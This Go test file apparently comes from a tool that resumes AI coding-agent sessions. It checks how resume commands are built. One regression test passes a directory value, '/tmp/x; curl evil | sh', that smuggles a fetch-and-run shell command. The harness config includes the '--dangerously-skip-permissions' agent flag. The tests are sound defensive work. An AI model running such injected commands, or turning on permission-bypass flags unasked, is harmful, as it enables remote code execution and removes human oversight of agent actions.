package app

import (
	"path/filepath"
	"strings"
	"testing"

	"github.com/agentswitch-org/ax/internal/config"
	"github.com/agentswitch-org/ax/internal/session"
	"github.com/agentswitch-org/ax/internal/shell"
)

func claudeHarness() config.Harness {
	return config.Harness{
		Name:   "claude",
		Format: "claude",
		Resume: "cd {dir} && claude --resume {id} --model {model} {args}",
		Launch: "claude --session-id {newid} {args}",
		Args:   "--dangerously-skip-permissions",
	}
}

func TestResumeUsesTranscriptStoreHome(t *testing.T) {
	for _, tc := range []struct {
		format, variable, pattern, file string
	}{
		{"codex", "CODEX_HOME", "sessions/*/*/*/rollout-*.jsonl", "sessions/2026/10/12/rollout-chat.jsonl"},
		{"claude", "CLAUDE_CONFIG_DIR", "projects/*/*.jsonl", "projects/project/chat.jsonl"},
		{"pi", "PI_CODING_AGENT_DIR", "sessions/*/*.jsonl", "sessions/project/chat.jsonl"},
	} {
		t.Run(tc.format, func(t *testing.T) {
			primary := filepath.Join(t.TempDir(), "primary")
			secondary := filepath.Join(t.TempDir(), "second account's home")
			h := config.Harness{Name: tc.format, Format: tc.format, Resume: "harness --resume {id}",
				Glob: config.StringList{filepath.Join(primary, filepath.FromSlash(tc.pattern)), filepath.Join(secondary, filepath.FromSlash(tc.pattern))}}
			s := session.Session{ID: "chat", File: filepath.Join(secondary, filepath.FromSlash(tc.file))}
			want := shell.InheritEnv([]shell.Op{shell.SetLiteral(tc.variable, secondary)}, "harness --resume "+shell.Quote("chat"))
			if got := resumeCmd(h, s, nil); got != want {
				t.Fatalf("resume used the wrong home:\n got %s\nwant %s", got, want)
			}
			// Cross-OS runtime selection is separate from discovery. Do not
			// inject a host path into a foreign executable's environment.
			h.Stores = []config.Store{{Glob: h.Glob[1], Label: "win"}}
			if got := resumeCmd(h, s, nil); strings.Contains(got, tc.variable) {
				t.Fatalf("foreign-store resume received a native home override: %s", got)
			}
		})
	}
}

// Enter resumes clean: an empty override strips the harness's configured args, so
// a YOLO flag parked in config never rides in on the most-pressed key.
func TestResumeCleanStripsConfiguredArgs(t *testing.T) {
	h := claudeHarness()
	s := session.Session{ID: "abc", Dir: "/home/agent/proj", Model: "opus"}
	empty := ""
	got := resumeCmd(h, s, &empty)
	if strings.Contains(got, "dangerously") {
		t.Fatalf("clean resume must not include configured args, got: %q", got)
	}
}

// E (WithArgs) passes a nil override, so each harness applies its own args.
func TestResumeWithArgsAppliesConfigured(t *testing.T) {
	h := claudeHarness()
	s := session.Session{ID: "abc", Dir: "/home/agent/proj", Model: "opus"}
	got := resumeCmd(h, s, nil)
	if !strings.Contains(got, "--dangerously-skip-permissions") {
		t.Fatalf("with-args resume must include configured args, got: %q", got)
	}
}

// A transcript-derived dir with shell metacharacters is quoted inert (injection
// regression from the security review).
func TestResumeQuotesHostileDir(t *testing.T) {
	h := claudeHarness()
	s := session.Session{ID: "abc", Dir: "/tmp/x; curl evil | sh", Model: "opus"}
	empty := ""
	got := resumeCmd(h, s, &empty)
	if strings.Contains(got, "curl evil | sh &&") || !strings.Contains(got, "'/tmp/x; curl evil | sh'") {
		t.Fatalf("hostile dir must be shell-quoted, got: %q", got)
	}
}

// An empty dir stays unquoted so `cd ` falls back to $HOME rather than erroring
// on `cd ”`.
func TestResumeEmptyDirStaysUnquoted(t *testing.T) {
	h := claudeHarness()
	s := session.Session{ID: "abc", Dir: "", Model: "opus"}
	empty := ""
	got := resumeCmd(h, s, &empty)
	if strings.Contains(got, "cd ''") {
		t.Fatalf("empty dir must not become cd '', got: %q", got)
	}
}

// A placeholder model that slipped into the index (claude logs "<synthetic>" on
// harness-injected messages; old caches may still carry it) must not reach the
// resume command line: the flag drops and the harness picks its default.
func TestResumeDropsPlaceholderModel(t *testing.T) {
	h := claudeHarness()
	s := session.Session{ID: "abc", Dir: "/home/agent/proj", Model: "<synthetic>"}
	empty := ""
	got := resumeCmd(h, s, &empty)
	if strings.Contains(got, "--model") || strings.Contains(got, "synthetic") {
		t.Fatalf("placeholder model must drop with its flag, got: %q", got)
	}
}
